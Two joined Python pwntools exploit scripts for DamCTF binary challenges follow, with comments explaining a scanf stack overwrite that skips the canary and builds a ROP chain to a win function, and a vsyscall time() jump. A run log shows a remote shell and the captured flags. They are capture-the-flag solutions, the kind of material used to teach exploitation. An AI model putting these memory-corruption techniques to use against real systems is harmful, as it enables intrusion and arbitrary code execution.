#!/usr/bin/env python3

from pwn import *

HOST = "chals.damctf.xyz"
PORT = 32575

local = False

binary = ELF("./allokay")

if local:
    p = process(binary.path)
else:
    p = remote(HOST, PORT)

# 0x17 is the index on the stack for the return value,
# so overwrite the 24th value

WIN = 0x0400767

rop = ROP(binary)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
SHELL = b"/bin/sh"
SHELL_INT = 0
BUFFER = 0x06010a3

print(hex(POP_RDI))

p.recvline("How many favorite numbers do you have?\n")
 
p.sendline(b'100' + SHELL + b'\00')

for i in range(0x17):
    p.sendline("-")

p.sendline(str(POP_RDI))
p.sendline(str(BUFFER))
p.sendline(str(WIN))

for i in range(100-(0x17 + 3)):
    p.sendline("-")

p.interactive()

# dam{4Re_u_A11_0cK4y}
#
# The solution was, except standard pwn, in 2 steps. The exploit was obvious in the fact that scanf wrote over the stack
# like so: scanf(%ld, stack[i]) in a while loop. The trick was to increment i without overwriting the stack, since
# there was a canary. There were 2 ways to do this, either by noticing that one of the values you could overwrite was
# actually "i", and then overwriting i to skip the canary and then just overwrite the return address. The other solution
# was that scanf(%ld) accepts "+" or "-", since +100 and -100 are valid integers. Thus by only inputting "+",
# scanf accepts it as valid input but since there is no number it has nothing to insert as a value and doesn't do anything.
# This allowed us to gain return control. The other part of the solution was managing to insert "/bin/sh" as a paremeter
# to the win() function which called execv() with our parameter. The trick here was that the main function that
# took in a max value for the loop did this with fgets() and then calling atoi() on the buffer, but atoi() works on strings
# such as "100/bin/sh" and simply returns 100, since PIE wasn't enabled we simply have to give our parameter as buffer[3]
# with buffer being "100/bin/sh\00".#!/usr/bin/env python3

from pwn import *
from time import time

HOST = "chals.damctf.xyz"
PORT = 32556

binary = ELF("./ghostbusters")

local = False

if local:
    p = process(binary.path)
else:
    p = remote(HOST, PORT)

vsyscall_time = "ffffffffff600400"

current_time = int(time())
sleep_time = 256 - (current_time - 121) % 256

print("Sleeping for", sleep_time, "seconds!")

sleep(sleep_time)
p.sendline(vsyscall_time)


p.interactive()

# By jumping to the (fixed) address of vsyscall_time(), we set the register RAX to the value of time()
# The program compares the AL register, that is, the 8 lowest bits of RAX, to "0x79", and if it matches
# We acquire shell. Thus we need time() to end in 0x79, or 121. 

# [*] '/home/oskar/CTF/DAM/pwn/ghostbusters/ghostbusters'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to chals.damctf.xyz on port 32556: Done
# Sleeping for 155 seconds!
# [*] Switching to interactive mode
# Who you gonna call?
# $ id
# uid=1000(chal) gid=1000(chal) groups=1000(chal)
# $ ls
# flag
# ghostbusters
# $ cat flag
# dam{th3_Gh0s75_0F_T1m3_k3ep_H4unTiNg_m3}
# $  